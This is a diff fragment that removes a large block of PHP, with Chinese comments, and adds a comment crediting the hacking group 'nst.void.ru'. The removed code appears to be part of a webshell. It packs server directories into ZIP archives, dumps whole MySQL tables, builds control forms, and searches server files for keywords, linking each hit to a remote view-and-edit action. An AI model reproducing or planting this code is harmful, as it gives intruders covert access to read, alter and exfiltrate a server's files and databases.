-			if ($relativepath_info[$i] == '.' || $relativepath_info[$i] == '') continue;
-			if ($relativepath_info[$i] == '..') {
-				$mainpath_info_count = count($mainpath_info);
-				unset($mainpath_info[$mainpath_info_count-1]);
-				continue;
-			}
-			$mainpath_info[count($mainpath_info)] = $relativepath_info[$i];
-		} //end for
-		return implode('/', $mainpath_info);
-	}
-
-	// 检查PHP配置参数
-	function getphpcfg($varname) {
-		switch($result = get_cfg_var($varname)) {
-			case 0:
-			return "No";
-			break;
-			case 1:
-			return "Yes";
-			break;
-			default:
-			return $result;
-			break;
-		}
-	}
-
-	// 检查函数情况
-	function getfun($funName) {
-		return (false !== function_exists($funName)) ? "Yes" : "No";
-	}
-
-	// 压缩打包类
-	class PHPZip{
-	var $out='';
-		function PHPZip($dir)	{
-    		if (@function_exists('gzcompress'))	{
-				$curdir = getcwd();
-				if (is_array($dir)) $filelist = $dir;
-		        else{
-			        $filelist=$this -> GetFileList($dir);//文件列表
-				    foreach($filelist as $k=>$v) $filelist[]=substr($v,strlen($dir)+1);
-	            }
-		        if ((!empty($dir))&&(!is_array($dir))&&(file_exists($dir))) chdir($dir);
-				else chdir($curdir);
-				if (count($filelist)>0){
-					foreach($filelist as $filename){
-						if (is_file($filename)){
-							$fd = fopen ($filename, "r");
-							$content = @fread ($fd, filesize ($filename));
-							fclose ($fd);
-						    if (is_array($dir)) $filename = basename($filename);
-							$this -> addFile($content, $filename);
-						}
-					}
-					$this->out = $this -> file();
-					chdir($curdir);
-				}
-				return 1;
-			}
-			else return 0;
-		}
-
-		// 获得指定目录文件列表
-		function GetFileList($dir){
-			static $a;
-			if (is_dir($dir)) {
-				if ($dh = opendir($dir)) {
-			   		while (($file = readdir($dh)) !== false) {
-						if($file!='.' && $file!='..'){
-            				$f=$dir .'/'. $file;
-            				if(is_dir($f)) $this->GetFileList($f);
-							$a[]=$f;
-	        			}
-					}
-     				closedir($dh);
-    			}
-			}
-			return $a;
-		}
-
-		var $datasec      = array();
-	    var $ctrl_dir     = array();
-		var $eof_ctrl_dir = "\x50\x4b\x05\x06\x00\x00\x00\x00";
-	    var $old_offset   = 0;
-
-		function unix2DosTime($unixtime = 0) {
-	        $timearray = ($unixtime == 0) ? getdate() : getdate($unixtime);
-		    if ($timearray['year'] < 1980) {
-				$timearray['year']    = 1980;
-        		$timearray['mon']     = 1;
-	        	$timearray['mday']    = 1;
-		    	$timearray['hours']   = 0;
-				$timearray['minutes'] = 0;
-        		$timearray['seconds'] = 0;
-	        } // end if
-		    return (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) | ($timearray['mday'] << 16) |
-			        ($timearray['hours'] << 11) | ($timearray['minutes'] << 5) | ($timearray['seconds'] >> 1);
-	    }
-
-		function addFile($data, $name, $time = 0) {
-	        $name     = str_replace('\\', '/', $name);
-
-		    $dtime    = dechex($this->unix2DosTime($time));
-	        $hexdtime = '\x' . $dtime[6] . $dtime[7]
-		              . '\x' . $dtime[4] . $dtime[5]
-			          . '\x' . $dtime[2] . $dtime[3]
-				      . '\x' . $dtime[0] . $dtime[1];
-	        eval('$hexdtime = "' . $hexdtime . '";');
-		    $fr   = "\x50\x4b\x03\x04";
-			$fr   .= "\x14\x00";
-	        $fr   .= "\x00\x00";
-		    $fr   .= "\x08\x00";
-			$fr   .= $hexdtime;
-
-	        $unc_len = strlen($data);
-		    $crc     = crc32($data);
-			$zdata   = gzcompress($data);
-	        $c_len   = strlen($zdata);
-		    $zdata   = substr(substr($zdata, 0, strlen($zdata) - 4), 2);
-			$fr      .= pack('V', $crc);
-	        $fr      .= pack('V', $c_len);
-		    $fr      .= pack('V', $unc_len);
-			$fr      .= pack('v', strlen($name));
-	        $fr      .= pack('v', 0);
-		    $fr      .= $name;
-
-			$fr .= $zdata;
-
-	        $fr .= pack('V', $crc);
-		    $fr .= pack('V', $c_len);
-			$fr .= pack('V', $unc_len);
-
-	        $this -> datasec[] = $fr;
-		    $new_offset        = strlen(implode('', $this->datasec));
-
-			$cdrec = "\x50\x4b\x01\x02";
-	        $cdrec .= "\x00\x00";
-		    $cdrec .= "\x14\x00";
-			$cdrec .= "\x00\x00";
-	        $cdrec .= "\x08\x00";
-		    $cdrec .= $hexdtime;
-			$cdrec .= pack('V', $crc);
-	        $cdrec .= pack('V', $c_len);
-		    $cdrec .= pack('V', $unc_len);
-			$cdrec .= pack('v', strlen($name) );
-	        $cdrec .= pack('v', 0 );
-		    $cdrec .= pack('v', 0 );
-			$cdrec .= pack('v', 0 );
-	        $cdrec .= pack('v', 0 );
-		    $cdrec .= pack('V', 32 );
-			$cdrec .= pack('V', $this -> old_offset );
-	        $this -> old_offset = $new_offset;
-		    $cdrec .= $name;
-
-			$this -> ctrl_dir[] = $cdrec;
-	    }
-
-		function file() {
-			$data    = implode('', $this -> datasec);
-	        $ctrldir = implode('', $this -> ctrl_dir);
-		    return
-			    $data .
-				$ctrldir .
-	            $this -> eof_ctrl_dir .
-		        pack('v', sizeof($this -> ctrl_dir)) .
-			    pack('v', sizeof($this -> ctrl_dir)) .
-				pack('V', strlen($ctrldir)) .
-	            pack('V', strlen($data)) .
-		        "\x00\x00";
-	    }
-	}
-
-	// 备份数据库
-	function sqldumptable($table, $fp=0) {
-		$tabledump = "DROP TABLE IF EXISTS $table;\n";
-		$tabledump .= "CREATE TABLE $table (\n";
-
-		$firstfield=1;
-
-		$fields = mysql_query("SHOW FIELDS FROM $table");
-		while ($field = mysql_fetch_array($fields)) {
-			if (!$firstfield) {
-				$tabledump .= ",\n";
-			} else {
-				$firstfield=0;
-			}
-			$tabledump .= "   $field[Field] $field[Type]";
-			if (!empty($field["Default"])) {
-				$tabledump .= " DEFAULT '$field[Default]'";
-			}
-			if ($field['Null'] != "YES") {
-				$tabledump .= " NOT NULL";
-			}
-			if ($field['Extra'] != "") {
-				$tabledump .= " $field[Extra]";
-			}
-		}
-		mysql_free_result($fields);
-	
-		$keys = mysql_query("SHOW KEYS FROM $table");
-		while ($key = mysql_fetch_array($keys)) {
-			$kname=$key['Key_name'];
-			if ($kname != "PRIMARY" and $key['Non_unique'] == 0) {
-				$kname="UNIQUE|$kname";
-			}
-			if(!is_array($index[$kname])) {
-				$index[$kname] = array();
-			}
-			$index[$kname][] = $key['Column_name'];
-		}
-		mysql_free_result($keys);
-
-		while(list($kname, $columns) = @each($index)) {
-			$tabledump .= ",\n";
-			$colnames=implode($columns,",");
-
-			if ($kname == "PRIMARY") {
-				$tabledump .= "   PRIMARY KEY ($colnames)";
-			} else {
-				if (substr($kname,0,6) == "UNIQUE") {
-					$kname=substr($kname,7);
-				}
-				$tabledump .= "   KEY $kname ($colnames)";
-			}
-		}
-
-		$tabledump .= "\n);\n\n";
-		if ($fp) {
-			fwrite($fp,$tabledump);
-		} else {
-			echo $tabledump;
-		}
-
-		$rows = mysql_query("SELECT * FROM $table");
-		$numfields = mysql_num_fields($rows);
-		while ($row = mysql_fetch_array($rows)) {
-			$tabledump = "INSERT INTO $table VALUES(";
-
-			$fieldcounter=-1;
-			$firstfield=1;
-			while (++$fieldcounter<$numfields) {
-				if (!$firstfield) {
-					$tabledump.=", ";
-				} else {
-					$firstfield=0;
-				}
-
-				if (!isset($row[$fieldcounter])) {
-					$tabledump .= "NULL";
-				} else {
-					$tabledump .= "'".mysql_escape_string($row[$fieldcounter])."'";
-				}
-			}
-
-			$tabledump .= ");\n";
-
-			if ($fp) {
-				fwrite($fp,$tabledump);
-			} else {
-				echo $tabledump;
-			}
-		}
-		mysql_free_result($rows);
-	}
-
-	class FORMS {
-		function tableheader() {
-			echo "<table width=\"775\" border=\"0\" cellpadding=\"3\" cellspacing=\"1\" bgcolor=\"#ffffff\">\n";
-		}
-
-		function headerform($arg=array()) {
-			global $dir;
-			if ($arg[enctype]){
-				$enctype="enctype=\"$arg[enctype]\"";
-			} else {
-				$enctype="";
-			}
-			if (!isset($arg[method])) {
-				$arg[method] = "POST";
-			}
-			if (!isset($arg[action])) {
-				$arg[action] = '';
-			}
-			echo "  <form action=\"".$arg[action]."\" method=\"".$arg[method]."\" $enctype>\n";
-			echo "  <tr>\n";
-			echo "    <td>".$arg[content]."</td>\n";
-			echo "  </tr>\n";
-			echo "  </form>\n";
-		}
-
-		function tdheader($title) {
-			global $dir;
-			echo "  <tr class=\"firstalt\">\n";
-			echo "	<td align=\"center\"><b>".$title." [<a href=\"?dir=".urlencode($dir)."\">返回</a>]</b></td>\n";
-			echo "  </tr>\n";
-		}
-
-		function tdbody($content,$align='center',$bgcolor='2',$height='',$extra='',$colspan='') {
-			if ($bgcolor=='2') {
-				$css="secondalt";
-			} elseif ($bgcolor=='1') {
-				$css="firstalt";
-			} else {
-				$css=$bgcolor;
-			}
-			$height = empty($height) ? "" : " height=".$height;
-			$colspan = empty($colspan) ? "" : " colspan=".$colspan;
-			echo "  <tr class=\"".$css."\">\n";
-			echo "	<td align=\"".$align."\"".$height." ".$colspan." ".$extra.">".$content."</td>\n";
-			echo "  </tr>\n";
-		}
-
-		function tablefooter() {
-			echo "</table>\n";
-		}
-
-		function formheader($action='',$title,$target='') {
-			global $dir;
-			$target = empty($target) ? "" : " target=\"".$target."\"";
-			echo " <form action=\"$action\" method=\"POST\"".$target.">\n";
-			echo "  <tr class=\"firstalt\">\n";
-			echo "	<td align=\"center\"><b>".$title." [<a href=\"?dir=".urlencode($dir)."\">返回</a>]</b></td>\n";
-			echo "  </tr>\n";
-		}
-
-		function makehidden($name,$value=''){
-			echo "<input type=\"hidden\" name=\"$name\" value=\"$value\">\n";
-		}
-
-		function makeinput($name,$value='',$extra='',$type='text',$size='30',$css='input'){
-			$css = ($css == 'input') ? " class=\"input\"" : "";
-			$input = "<input name=\"$name\" value=\"$value\" type=\"$type\" ".$css." size=\"$size\" $extra>\n";
-			return $input;
-		}
-
-		function maketextarea($name,$content='',$cols='100',$rows='20',$extra=''){
-			$textarea = "<textarea name=\"".$name."\" cols=\"".$cols."\" rows=\"".$rows."\" ".$extra.">".$content."</textarea>\n";
-			return $textarea;
-		}
-
-		function formfooter($over='',$height=''){
-			$height = empty($height) ? "" : " height=\"".$height."\"";
-			echo "  <tr class=\"secondalt\">\n";
-			echo "	<td align=\"center\"".$height."><input class=\"input\" type=\"submit\" value=\"确定\"></td>\n";
-			echo "  </tr>\n";
-			echo " </form>\n";
-			echo $end = empty($over) ? "" : "</table>\n";
-		}
-
-		function makeselect($arg = array()){
-			if ($arg[multiple]==1) {
-				$multiple = " multiple";
-				if ($arg[size]>0) {
-					$size = "size=$arg[size]";
-				}
-			}
-			if ($arg[css]==0) {
-				$css = "class=\"input\"";
-			}
-			$select = "<select $css name=\"$arg[name]\"$multiple $size>\n";
-				if (is_array($arg[option])) {
-					foreach ($arg[option] AS $key=>$value) {
-						if (!is_array($arg[selected])) {
-							if ($arg[selected]==$key) {
-								$select .= "<option value=\"$key\" selected>$value</option>\n";
-							} else {
-								$select .= "<option value=\"$key\">$value</option>\n";
-							}
-
-						} elseif (is_array($arg[selected])) {
-							if ($arg[selected][$key]==1) {
-								$select .= "<option value=\"$key\" selected>$value</option>\n";
-							} else {
-								$select .= "<option value=\"$key\">$value</option>\n";
-							}
-						}
-					}
-				}
-			$select .= "</select>\n";
-			return $select;
-		}
-	}
-	
-	function find($path) //查找关键词 
-{ 
-	global $oldkey,$type,$type2,$endline,$beline; 
-	if(is_dir("$path")){ 
-	$tempdir=opendir("$path");
-	while($f=readdir($tempdir)){ if($f=="."||$f=="..")continue;  find("$path/$f");}
-	closedir($tempdir);
-	}else{ 
-	if(filesize("$path")){ 
-	$fp=fopen("$path","r"); 
-	$msg=fread($fp, filesize("$path"));
-	fclose($fp); 
-if(strpos($msg, $oldkey) !== false) {
-	$dir = dirname($path);
-	$file = basename($path);
-if($type=="list"){
-	$mymsg = explode("\n",$msg);
-	$long = count($mymsg);
-	$tmp = explode($oldkey,$msg);
-	$tmp = explode("\n",$tmp[0]);
-	$first = count($tmp);
-	$end = "[".$first."/".$long."]";
-}
-if($type2=="getpath"){
-	$get = explode($oldkey,$msg);
-	$get = strlen($get[0]);
-	if(isset($beline)){
-	$get = $get-$beline;
-	}
-	$getpath = htmlspecialchars(substr($msg, $get, $endline)); 
-	$getpath = "title = \"".$getpath."\"";
-}
-echo "<span class=\"redfont\" $getpath>找到:$dir/$file</span> |<a href=\"?action=editfile&dir=$dir&editfile=$file\" target=\"_blank\">view+edit</a> | $end <br>";
-}
-                              } 
-                         }                    
-} 
-?>
+<!-- Network security team :: nst.void.ru -->
